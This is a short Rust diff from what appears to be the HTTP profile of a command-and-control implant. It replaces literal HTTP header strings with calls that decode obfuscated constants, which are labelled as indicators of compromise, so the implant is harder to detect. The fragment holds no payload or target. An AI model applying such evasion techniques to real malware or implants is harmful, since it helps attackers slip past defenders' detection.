@@ -55,10 +55,10 @@ impl C2Profile for HTTPProfile {
 fn http_post(url: &str, body: &str) -> Result<String, Box<dyn Error>> {
     // Create a new post request with the configured user agent and timeout
     let mut req = minreq::post(url)
-        .with_header("User-Agent", profilevars::useragent())
-        .with_header("Content-Type", "application/json")
-        .with_header("Connection", "keep-alive")
-        .with_timeout(30) // 30 second timeout
+        .with_header(&crate::obfstr::d(crate::obfstr::IOC_UA_HEADER), profilevars::useragent())
+        .with_header(&crate::obfstr::d(crate::obfstr::IOC_CT_HEADER), &crate::obfstr::d(crate::obfstr::IOC_JSON_CT))
+        .with_header(&crate::obfstr::d(crate::obfstr::IOC_CONN_HEADER), &crate::obfstr::d(crate::obfstr::IOC_CONN_KEEPALIVE))
+        .with_timeout(30)
         .with_body(body);
 
     // Add any additional headers
